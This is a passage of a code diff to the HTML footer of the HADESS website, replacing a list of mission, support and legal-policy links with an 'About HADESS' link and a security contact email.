-          <li><a href="/" target="_blank" rel="noopener noreferrer" style="font-size:13px;color:var(--text-muted)">About HADESS</a></li>
-          <li><a href="https://career.hadess.io/mission" style="font-size:13px;color:var(--text-muted)">Our Mission</a></li>
-          <li><a href="mailto:career@hadess.io" style="font-size:13px;color:var(--text-muted)">Support</a></li>
-        </ul>
-        <h3 style="font-size:15px;font-weight:600;color:#fff;margin:28px 0 16px">Legal</h3>
-        <ul style="list-style:none;display:flex;flex-direction:column;gap:10px">
-          <li><a href="https://career.hadess.io/terms" style="font-size:13px;color:var(--text-muted)">Terms of Service</a></li>
-          <li><a href="https://career.hadess.io/privacy" style="font-size:13px;color:var(--text-muted)">Privacy Policy</a></li>
-          <li><a href="https://career.hadess.io/cancellation-policy" style="font-size:13px;color:var(--text-muted)">Cancellation Policy</a></li>
-          <li><a href="https://career.hadess.io/cookie-policy" style="font-size:13px;color:var(--text-muted)">Cookie Policy</a></li>
-          <li><a href="https://career.hadess.io/imprint" style="font-size:13px;color:var(--text-muted)">Imprint</a></li>
-          <li><a href="https://career.hadess.io/dmca" style="font-size:13px;color:var(--text-muted)">DMCA Notice</a></li>
-          <li><a href="https://career.hadess.io/image-rights" style="font-size:13px;color:var(--text-muted)">Image Rights</a></li>
-          <li><a href="https://career.hadess.io/security" style="font-size:13px;color:var(--text-muted)">Security</a></li>
+          <li><a href="/about-us/" style="font-size:13px;color:var(--text-muted)">About HADESS</a></li>
+          <li><a href="mailto:security@hadess.io" style="font-size:13px;color:var(--text-muted)">Contact</a></li>
         </ul>
       </div>
     </div>
